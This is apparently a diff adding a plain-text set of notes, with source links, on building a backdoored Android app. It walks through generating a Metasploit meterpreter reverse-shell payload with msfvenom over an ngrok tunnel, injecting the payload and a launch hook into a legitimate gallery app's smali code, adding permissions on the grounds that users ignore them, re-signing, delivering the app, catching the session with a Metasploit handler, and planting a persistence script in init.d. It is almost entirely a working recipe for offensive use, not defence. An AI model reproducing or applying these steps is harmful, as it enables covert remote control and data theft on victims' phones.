@@ -1,0 +1,149 @@
+https://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-part-2-do-manually-0167124/
+https://stackoverflow.com/questions/23750259/certificate-chain-not-found-how-to-fix-and-publish-to-google-play-store
+//
+Open terminal
+
+cd /root
+./ngork tcp 8888
+
+GENERATE the PAYLOAD:
+
+	msfvenom -p android/meterpreter/"Payload_Type" LHOST="IP_Address" LPORT="Incoming_Port" -o "PayloadApkName".apk	
+	or
+	msfvenom -p android/meterpreter/"Payload_Type" LHOST="IP_Address" -o "PayloadApkName".apk	
+	
+	eg: reverse_tcp , 0.tcp.ngrok.io , 11844 , meterpreter // from ngrok site
+
+Payload_Types are –
+
+1.reversetcp
+2.reverse_http
+3.reverse_https	
+
+DECOMPILE the APKs:
+
+	apktool d -f -o payload "path of the payload apk file"
+	eg: /root/meterpreter.apk
+
+	apktool d -f -o original "path of the original apk file"
+	eg: /root/Gallery.apk
+
+COPY the PAYLOAD FILES:
+
+	Just go to "/root/payload/smali/com/metasploit/stage" and copy all the .smali files whose file name contains the word 'payload'. 
+	Now paste them in "/root/original/smali/com/metasploit/stage". Note that this folder does not exists, so you have to create it.
+
+INJECT the HOOK in the ORIGINAL .SMALI CODE:
+
+	To ensure that the payload runs, we have to inject a hook in the original apk's .smali code.
+	We are going to place the hook so that when the app is launched, it will also launch the payload with it.
+
+	open up the AndroidManifest.xml file located inside the "/root/original" folder using any text editor.
+
+	look for an <activity> tag which contains both the lines –
+
+	_<action android:name="android.intent.action.MAIN"/>
+	<category android:name="android.intent.category.LAUNCHER"/>_
+
+	note its "android:name" attribute's value. eg: "com.simplemobiletools.gallery.activities.MainActivity".
+
+	open the .smali code of that activity using gedit. Just open a terminal and type –
+
+		gedit /root/original/smali/"Activity_Path"
+		eg: gedit /root/original/smali/com/simplemobiletools/gallery/activities/MainActivity.smali 
+
+	Now search for the following line in the smali code using CTRL+F – ;->onCreate(Landroid/os/Bundle;)V
+
+	When you locate it, paste the following code in the line next to it – 
+		invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
+
+	What we are doing here is, inserting a code which starts the payload alongside the existing code which is executed when the activity starts.
+	Now, save the edited smali file.
+
+INJECT the NECESSARY PERMISSIONS:
+
+	Additional finer-grained security features are provided through a "permission" mechanism 
+	that enforces restrictions on the specific operations that a particular process can perform.
+
+	If we do not mention all the additional permissions that our payload is going to need, it cannot function properly. 
+	While installing an app, these permissions are shown to the user. 
+	But most of the users don't care to read all those boring texts, so we do not have to worry about that much.
+
+	These permissions are also listed in the previously encountered AndroidManifest file. 
+	So let's open the AndroidManifest.xml of both the original app and the payload from the respective folders. 
+	The permissions are mentioned inside <uses-permission> tag as an attribute 'android:name'. 
+	Copy the additional permission lines from the Payload's AndroidManifest to the original app's one. 
+	But be careful that there should not be any duplicate.
+
+RECOMPILE the ORIGINAL APK:
+	
+	Recompile the backdoored app into an installable apk.
+		apktool b /root/original
+	O/p: compiled apk inside the "/root/original/dist" directory.
+
+SIGN the APK:
+	keytool -genkey -v -keystore "keystore name".keystore -alias "alias name" -keyalg RSA -keysize 2048 -validity 10000
+		eg: -keystore =  Keystore.keystore,  -alias =  GalleryKey
+
+	enter the password for the keystore, eg: 12345678 twice
+	enter the credentials you want to display in the certificate
+	thus a keystore is created! with given name
+
+	jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "path of the keystore".keystore "path of the apk to sign".apk "alias name given above"
+		eg: -keystore = /root/original/dist/Keystore.keystore, apkname =  /root/original/dist/Gallery.apk, alias =  GalleryKey
+	enter the previous entered password now
+
+Boom!!! There you are.. Backdoored successfully.
+
+
+Now upload the file to the device
+1) Copy the apk file to the /root/var/www/html drectory
+	service apache2 start
+
+or
+
+2) Copy to the storage via file explorer
+
+or
+
+3) install over adb
+
+	adb devices
+	adb install "path of the apk file"
+
+/*Download app to the device and install*/
+
+
+Fire Up Kali and Hack an Android System:
+
+	msfconsole
+	use exploit/multi/handler
+	set payload android/meterpreter/reverse_tcp
+	set LHOST 192.168.0.4
+	exploit
+
+Create a Persistent Script:
+
+--------------------------------------------------------------------------------------------------------
+#!/bin/bash
+while :
+do am start --user o -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity 
+sleep 20
+done 
+--------------------------------------------------------------------------------------------------------
+
+Make a .sh file 
+
+Upload It to the Hacked Android System: to etc/init.d/
+
+	cd /
+	ls
+	cd etc
+	ls
+	cd init.d
+	ls
+
+
+Time to Upload the Shell Script:
+
+	upload "filname".sh
